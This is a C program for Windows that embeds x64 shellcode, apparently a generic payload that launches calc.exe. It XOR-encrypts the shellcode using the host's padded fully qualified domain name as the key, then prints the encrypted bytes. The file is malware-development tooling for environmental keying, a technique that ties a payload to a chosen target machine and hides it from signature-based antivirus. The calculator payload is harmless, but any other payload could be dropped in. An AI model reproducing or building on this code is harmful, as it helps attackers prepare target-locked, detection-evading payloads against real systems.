#include <stdio.h>
#include <Windows.h>
#include <string.h>


char shellcode[] = "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
"\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";


size_t szSc = sizeof(shellcode);


void func(char *data, size_t len, char *key) {
	for (size_t i = 0; i < len; i++)
		data[i] ^= key[i % strlen(key)];
}



char* getHnameAndPadIt(char* computerName, DWORD *size, char buffer) {
	// XOR/RC5 something and unlock with the hash of this
	//get the computer name 
	/*printf("size of the hostname in bits is: %i\n", *size * 8);*/ /* size of char is 8 bits. computerName is an array of chars. */

	while (*size * 8 < 128) {
		computerName[*size] = buffer;
		computerName[*size + 1] = '\0';
		(*size)++;
		if (*size > 256) break;
	}
	return computerName;

	//printf("padded computerName is: %s\n", computerName);
	//printf("size of the padded computerName is: %i\n", size * 8);
}


int main(void) {
	char computerName[256];
	DWORD size = sizeof(computerName);
	/*
	this is the definition of nSize parameter for GetComputerNameExA function from MSDN:

	[in, out] nSize
	On input, specifies the size of the buffer, in TCHARs.On output, receives the number of TCHARs copied 
	to the destination buffer, not including the terminating null character.

	so the size variable will be adjustede to however many chars there will be in the hostname 
	retrieved using the GetComputerNameExA function, excluding null terminator('\0'). 
	this is why we can use size variable as we do.
		
	*/
	if (GetComputerNameExA(ComputerNameDnsFullyQualified, computerName, &size)) {
		printf("Computer FQDN: %s\n", computerName);
	}
	else {
		printf("Error retrieving computer name %lu \n", GetLastError());
	}
	getHnameAndPadIt(computerName, &size, 'a');
	printf("%s\n", computerName);
	printf("size of padded computer name %i\n", size * 8);



	func(shellcode, szSc, computerName);

	printf("XOR'd shellcode (in hex):\n");
	for (size_t i = 0; i < szSc; i++) {
		printf("%02x ", (unsigned char)shellcode[i]);
		if ((i + 1) % 16 == 0) {  // Print 16 bytes per line for readability
			printf("\n");
		}
	}
	printf("\n");

}